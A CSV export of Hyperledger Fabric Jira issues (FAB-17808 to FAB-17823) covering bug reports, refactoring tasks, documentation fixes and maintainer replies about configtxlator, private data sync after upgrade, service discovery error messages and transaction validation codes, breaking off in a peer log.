fix word in configtx.yaml,FAB-17808,44943,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,Eggsy,Eggsy,Eggsy,24/Apr/20 11:06 PM,29/Apr/20 9:18 PM,28/Oct/23 3:10 AM,29/Apr/20 9:18 PM,v2.0.1,,,,,,,,,,,,,,,,,,,,,,0,,,,,,fix word in configtx.yaml,,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bff:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Delete channel-specific data from stateleveldb, confighistorydb, historydb, bookkeepingdb",FAB-17809,44944,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wenjian,wenjian,25/Apr/20 12:28 AM,11/Jul/20 11:03 PM,28/Oct/23 3:10 AM,11/Jul/20 11:03 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bfn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Jul/20 2:33 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1547];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Check nil return from pem.Decode in configtx,FAB-17810,44946,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,25/Apr/20 9:14 AM,02/May/20 3:21 AM,28/Oct/23 3:10 AM,02/May/20 3:21 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,Looks like we don't check any nil values from pem.Decode. We should probably return an empty certificate or error if decoding returns nil else it will panic when attempting to parse the bytes.,,caod,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17811,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzr9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Apr/20 10:55 PM;caod;[~xwu] it hasn't been publicly propagated yet, but when you push this PR can you make it against [https://github.com/hyperledger/fabric-config]? We've moved the config package out to a separate repo for consumption. Thanks!;;;","29/Apr/20 10:43 PM;xwu;fabric-config: https://github.com/hyperledger/fabric-config/pull/12

However, the unit-tests failed basically for the same reason ""unmarshalling capabilities: proto: cannot parse reserved wire type"". In expectedErr, the space between “proto:” and “cannot"" is replaced by \u00a0. If you feel suitable, I can fix this bug together in this PR.[~caod];;;","29/Apr/20 11:27 PM;caod;[~xwu] yeah we saw that bug yesterday and had no clue what was causing it. We moved around some of the dependencies/go modules and that may have fixed it if you want to rebase on master.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate uses of PEM decoding in Fabric's code base,FAB-17811,44947,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,yacovm,yacovm,25/Apr/20 10:56 PM,28/Sep/20 10:09 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"We need to ensure that an adversary cannot mutate PEM encoded certificates to:

# Gain plurality of identities corresponding to a single private key
# Cause a software error
# Cause significant space (memory or storage) overhead on nodes

",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17810,,,FAB-17778,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zs002",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Publish fabric-protos npm module from hyperledger/fabric-protos,FAB-17812,44952,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,heatherp,heatherp,27/Apr/20 6:33 PM,01/May/20 11:33 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-sdk-node,,,,,,,,,0,,,,,,"fabric-sdk-node has a copied version of hyperledger/fabric-protos and publishes that at as a module. This means it's liable to not pick up changes made to hyperledger/fabric-protos. fabric-chaincode-node copies fabric-protos and relies on it, so this is liable to the same issue.

Both can be resolved by hyperledger/fabric-protos publishing the npm module and sdk-node/chaincode-node updated to rely on that.

List of stuff would include (perhaps not in this order):
 * publish fabric-protos from from hyperledger/fabric-protos
 * update node-sdk and chaincode-node to use new hyperledger/fabric-protos npm module
 * turn off fabric-protos publishing from node-sdk repository
 * remove fabric-protos npm module from node-sdk",,heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCJ-53,FABCN-48,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bh7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function that adds a consortium,FAB-17813,44953,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,27/Apr/20 10:32 PM,30/Apr/20 12:13 AM,28/Oct/23 3:10 AM,30/Apr/20 12:13 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API I would like to call a function to add a new consortium to the consortiums group. Consider any implications that may arise should the user not add any orgs to the new consortium (if that even matters) as well as for any examples (we should add orgs to the consortium after adding a new consortium in any examples).

 

*Acceptance*

I can call a function to add a new consortium group. Examples are also updated demonstrating addition of a new consortium + orgs for that consortium.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzf",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Apr/20 1:13 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1185];;;","28/Apr/20 6:16 AM;tsharris;[https://github.com/hyperledger/fabric-config/pull/7];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove interfaces and flattenout kvledger/txmgmt/validator package,FAB-17814,44957,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,28/Apr/20 1:15 AM,28/Apr/20 9:49 PM,28/Oct/23 3:10 AM,28/Apr/20 9:48 PM,,,,,,,,,,v2.2.0,,,,,,,,,,,,,0,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bi3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtxlator: error: open /dev/stdout: permission denied,FAB-17815,44958,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,hello2mao,hello2mao,28/Apr/20 3:17 PM,04/Sep/21 12:52 AM,28/Oct/23 3:10 AM,08/Jan/21 3:43 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Following guide: [https://hyperledger-fabric.readthedocs.io/en/latest/channel_update_tutorial.html#convert-the-configuration-to-json-and-trim-it-down]

 

When run below cmd returns error:

 
{code:java}
configtxlator proto_decode --input config_block.pb --type common.Block | jq .data.data[0].payload.data.config > config.json

zsh: no matches found: .data.data[0].payload.data.config
configtxlator: error: open /dev/stdout: permission denied, try --help
{code}
 

Set --output manually is OK:
{code:java}
configtxlator proto_decode --input config_block.pb --type common.Block --output=full_config_block.json
{code}
 

Related:

[https://lists.hyperledger.org/g/fabric/topic/configtxlator_error_open/70060144?p=,,,20,0,0,0::recentpostdate%2Fsticky,,,20,2,0,70060144]

 

Other info:
 * OS: MacOS 10.15.4
 * configtxlator:
 Version: 2.0.1
 Commit SHA: 1cfa5da98
 Go version: go1.13.4
 OS/Arch: darwin/amd64 ",,btl5037,denyeart,hello2mao,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bib:",,,,Unset,Unset,,"configtxlator proto_decode --input config_block.pb --type common.Block | jq .data.data[0].payload.data.config > config.json",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,hello2mao,wlahti,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.3,release-2.2,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/May/20 2:39 AM;btl5037;This is a very common OS issue, and not related to Fabric. You can search for  ""open /dev/stdout: permission denied"" on Google and decide which of the methods for resolving this issue you are comfortable with.;;;","04/May/20 3:48 AM;denyeart;Per Brett's comment I'll close.
If you think a fix is needed in Fabric please re-open and clarify the request.;;;","08/Jan/21 2:47 AM;wlahti;I hit this yesterday and with the help of [~btl5037] we figured out it's actually a buffer size issue with | on mac. Brett came up with a good alternative so I'm going to open a PR.

edit: Actually, the create channel tutorial already modified the directions for a similar step so we'll follow the lead there:


{noformat}
configtxlator proto_decode --input config_block.pb --type common.Block --output config_block.json
jq .data.data[0].payload.data.config config_block.json > config.json
{noformat}
;;;","08/Jan/21 3:23 AM;wlahti;https://github.com/hyperledger/fabric/pull/2246;;;","08/Jan/21 4:51 AM;wlahti;This error does occur when running that command on mac, but note that the steps were designed to be run in the org3cli container. Splitting the step into two while using a file, config_block.json, for the intermediate output resolves things.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Private data not getting fully synced after upgrading the peers from 1.4.2 to 2.0,FAB-17816,44960,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Invalid: Works as Expected,,ginspctw,ginspctw,28/Apr/20 11:24 PM,01/May/20 12:11 AM,28/Oct/23 3:10 AM,01/May/20 12:11 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"We are trying to upgrade our hyperledger fabric setup from 1.4.2 to 2.0. We have a kubernetes setup and has 2 organisation in the channel. We use couchdb for peers. We first upgraded all the orderers and when trying to upgrade the peer to 2.0 we performed ""*peer node upgrade-dbs*""  on the peers to bring it up align with 2.0 and deleted ""data"" folder in couchdb. So first we upgraded peers of one organisation to 2.0 and kept the other Org peers in 1.4.2 hoping the data will get synced. But the issue we are facing here is that we have a chaincode in which we use private data collection both the orgs are part of the same collection but after the upgrade of the peers to 2.0 we couldn't get all the private datas in sync. When looked at the peer logs we found the following when the peer gets started.

""
 2020-04-27 09:17:46.004 UTC [lockbasedtxmgr] ValidateAndPrepare -> DEBU 438 Waiting for purge mgr to finish the background job of computing expirying keys for the block
 2020-04-27 09:17:46.004 UTC [lockbasedtxmgr] ValidateAndPrepare -> DEBU 439 lock acquired on oldBlockCommit for validating read set version against the committed version
 2020-04-27 09:17:46.004 UTC [lockbasedtxmgr] ValidateAndPrepare -> DEBU 43a Validating new block with num trans = [10]
 2020-04-27 09:17:46.004 UTC [valimpl] ValidateAndPrepareBatch -> DEBU 43b ValidateAndPrepareBatch() for block number = [9]
 2020-04-27 09:17:46.004 UTC [valimpl] ValidateAndPrepareBatch -> DEBU 43c preprocessing ProtoBlock...
 2020-04-27 09:17:46.004 UTC [valimpl] preprocessProtoBlock -> WARN 43d Channel [mychannel]: Block [9] Transaction index [0] TxId [be338890fc17dbdc4f684b1ab909032f6c286380fd52babfc260526fe485fd04] marked as invalid by committer. Reason code [MVCC_READ_CONFLICT]"".

 

Please guide me if someone has faced any similar issues while upgrading the fabric network. How can I upgrade the network from 1.4.2 to 2.0 in a kubernetes setup without loosing any private data?",,denyeart,ginspctw,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bir:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,ginspctw,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Apr/20 12:32 PM;denyeart;[~ginspctw]
upgrade-dbs drops the state database but does not drop the block store or private data store.  The next time the peer starts, it will rebuild the state database, using the public data from the block store, and the private data from the private data store. Therefore, there is no need or expectation to 'sync' private data in normal upgrade scenario.

If you accidentally delete the private data store yourself, then the peer will not be in an expected state and the next time it starts it will not be able to rebuild the state database, and will instead a report an error ""Failed to load ledger mychannel(The store is empty)"". This would be a much worse problem than private data sync, you'd have to recreate the peer and rejoin channels so that it can process blocks and retrieve private data from another peer.

The invalid transaction is not related.  The transaction will be marked invalid in the block store and will not be applied to the state database,  this has nothing to do with private data or upgrade scenario. The transaction must have been invalid prior to the upgrade attempt.

All that being said, I'm not sure what you mean by ""we couldn't get all the private datas in sync"".  What is the exact error message you get? Could you post your logs?  Ideally with peer debug such as:

{code:java}
FABRIC_LOGGING_SPEC=info:kvledger,ledgerstorage,statecouchdb,transientstore,gossip.privdata,chaincode.platform=debug peer node start
{code}
;;;","01/May/20 12:09 AM;ginspctw;Hi David Enyeart,

Thank you for the detailed explanation. I managed to get all the data back after recreating the peer and rejoining the channel.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fileLock code is redundant,FAB-17817,44964,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,29/Apr/20 1:48 AM,29/Apr/20 1:48 AM,28/Oct/23 3:10 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"Currently, the fileLock is acquired in upgradeDBs, rollback, reset, and ledger initialized. We can avoid this duplication if possible. ",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01biz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve documentation in Fabric samples repository,FAB-17818,44969,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,negupta,negupta,29/Apr/20 5:24 AM,01/May/20 1:33 AM,28/Oct/23 3:10 AM,01/May/20 1:33 AM,v2.1.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"The documentation in the fabric samples is outdated, and references running bootstrap.sh
yourself, which duplicates the existing Fabric.

Open this issue to 1) link to existing doc so that the samples can capture downstream improvements in the doc experience
2) add a table with a short description of each sample and links to relevant documentation",,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bjf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/May/20 1:33 AM;negupta;https://github.com/hyperledger/fabric-samples/pull/170;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Service discovery - endorsement service error message not user friendly,FAB-17819,44970,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Apr/20 7:46 AM,01/May/20 4:44 AM,28/Oct/23 3:10 AM,01/May/20 4:44 AM,v1.4.6,v2.1.0,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,,,,,,"If you use the service discovery endorsement query, but chaincode is only installed on one peer in the network when endorsement policy requires that two orgs endorse, you'll get the following error message:

{code:java}
[discovery] chaincodeQuery -> ERRO 0b2 Failed constructing descriptor for chaincode chaincodes:<name:""papercontract"" > ,: cannot satisfy any principal combination
{code}

Users don't know what a 'principal' is and therefore they don't know how to troubleshoot this error message.

The related code is at:

https://github.com/hyperledger/fabric/blob/master/discovery/endorsement/endorsement.go#L153 

 Ideally the error message should say something like ""chaincode not installed on enough peers to meet endorsement policy"".

Similarly, we should look at the error message for the following scenarios:
len(peersOfChannel) == 0
len(chanMembership) == 0",,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bjn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Apr/20 7:34 PM;yacovm;{quote}Similarly, we should look at the error message for the following scenarios:
len(peersOfChannel) == 0
len(chanMembership) == 0
{quote}
It's == 1, because you always have your own peer right?

In any case - it's not that easy to return an error about not knowing any peer outside of yourself, because you might use service discovery and the peer that you query for discovery can satisfy the endorsement policy on its own.

We have logs in gossip that print membership changes, so you should be able to look at the logs and know if you know peers or not.

Discovery is not there to teach the user how to configure the network, because it's a service that is used in a non interactive manner (background task in the SDK, and not a synchronous one).

 
{quote}
If you use the service discovery endorsement query, but chaincode is only installed on one peer in the network when endorsement policy requires that two orgs endorse, you'll get the following error message:
{code:java}
[discovery] chaincodeQuery -> ERRO 0b2 Failed constructing descriptor for chaincode chaincodes:<name:""papercontract"" > ,: cannot satisfy any principal combination
{code}
Users don't know what a 'principal' is and therefore they don't know how to troubleshoot this error message.
{quote}

The change was much bigger than i estimated: [https://github.com/hyperledger/fabric/pull/1193] .
I had to preserve the current semantics of the service and wanted to make as less flow control changes as possible.


 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test-network createChannel.sh createChannelTx() misleading print statements.,FAB-17820,44972,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,robmurgai,robmurgai,29/Apr/20 1:26 PM,11/May/20 7:14 PM,28/Oct/23 3:10 AM,11/May/20 7:14 PM,,,,,,,,,,v2.2.0,,,,fabric-samples,,,,,,,,,0,,,,,,"In createChannelTx(), at the very beginning we echo ""### Generating channel configuration transaction ..."".  Shouldn't this really say ""### Generating channel creation transaction ...""??

Its trivial, but anyone new trying this would want to understand what's going on and search for a  ""Channel Configuration Transaction"" in read the docs to understand how Channels are created.",,denyeart,robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bk3:",,,,Unset,Unset,,$ ./network.sh createChannel,,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,robmurgai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/May/20 4:43 AM;denyeart;[~robmurgai] good catch, you can review the update:

https://github.com/hyperledger/fabric-samples/pull/172
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
use keyword as variable name,FAB-17821,44973,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Eggsy,Eggsy,Eggsy,29/Apr/20 2:37 PM,29/Apr/20 9:18 PM,28/Oct/23 3:10 AM,29/Apr/20 9:18 PM,v1.4.6,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"pluginfactory.go/Get() 

use keywords(new) as variable names",,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bkb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix word,FAB-17822,44975,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,Eggsy,Eggsy,Eggsy,29/Apr/20 9:07 PM,29/Apr/20 9:50 PM,28/Oct/23 3:10 AM,29/Apr/20 9:50 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,fix some error word,,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bkj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
txValidationCode is not the same for all the peers for the same block  ,FAB-17823,44976,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,manish-sethi,KoushKilla,KoushKilla,30/Apr/20 5:24 AM,23/Nov/20 11:19 PM,28/Oct/23 3:10 AM,23/Nov/20 11:19 PM,v1.4.0,v1.4.2,,,,,,,,,,,,fabric-ledger,,,,,,,,,2,,,,,,"Noticed that when a peer leaves an application channel (peer container is rebuild with no disk mounting enabled, so channel data on the peer gets wiped out) and when the peer rejoins the same channel again the prior blocks become invalid only on the peer that was rebuilt. 

Tried peer node reset on the peer that left the channel but prior blocks are still invalid. 

Network setup: 

2 Org - 4 Peers (2 peers per Org)

HF: 1.4.2

 

 ",,ddhulla,denyeart,konung2000,KoushKilla,manish-sethi,MHBauer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bkr:",,,,Unset,Unset,,"1. Create a HF 1.4.2 Network with 2 Orgs and atleast one peer per Org
2. Load the network with transactions (around a 100)
3. Check the txValidation Code of a random transaction block. Should be Valid. 
4. Change minor peer configuration for one of the peers, such as debugging level or timeout value. 
5. Rebuild the peer container which configuration was changed. (Make sure disk mounting is disabled) (I used the command docker-compose up -d --build)
6. Rejoin Channel. (Since all channel data was lost when rebuilding the container because disk mounting was not enabled.)
7. Check the validity of the same block in step 3, the txValidationCode should change from valid to invalid now. Only for the peer that was rebuild. 
8. Stop the peer container that was rebuilt, execute peer node reset and started the peer container up again. The blocks still has an invalid txValidationCode and is different from other peers even though the peer was reset from the genesis block of the channel. 
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),ddhulla,denyeart,konung2000,KoushKilla,manish-sethi,MHBauer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/May/20 4:48 AM;denyeart;[~KoushKilla] You're right, the validation codes should be the same across all peers, even after rebuild.

Please upload the peer logs so that we can see what the invalidation code is.

BTW, I am not able to reproduce... the transactions in my blocks are always valid.;;;","07/May/20 1:09 AM;KoushKilla;Hi,

 

Thank you for taking a look at the ticket and getting back to me. After more careful examination I only see this type of error for only certain blocks. For an example my channel has 4 blocks, where as blocks 1,2,4 are synchronized with the other peers however block 3 is invalid after rebuilding the container with out disk-mounting on the peer, and what’s more weird is that when I rebuild the exact same peer container the second time then block 3 changes from invalid to valid? Any thoughts?

 

Below are the peer logs after I join the channel again,

 

Below are logs of peer0 (peer after it got rebuild the first time)

 
{code:java}
2020-05-06 15:51:00.630 UTC [nodeCmd] serve -> INFO 001 Starting peer:
 Version: 1.4.4
 Commit SHA: 7917a40
 Go version: go1.12.12
 OS/Arch: linux/amd64
 Chaincode:
  Base Image Version: 0.4.18
  Base Docker Namespace: hyperledger
  Base Docker Label: org.hyperledger.fabric
  Docker Namespace: hyperledger
2020-05-06 15:51:00.631 UTC [ledgermgmt] initialize -> INFO 002 Initializing ledger mgmt
2020-05-06 15:51:00.631 UTC [kvledger] NewProvider -> INFO 003 Initializing ledger provider
2020-05-06 15:51:00.677 UTC [kvledger] NewProvider -> INFO 004 ledger provider Initialized
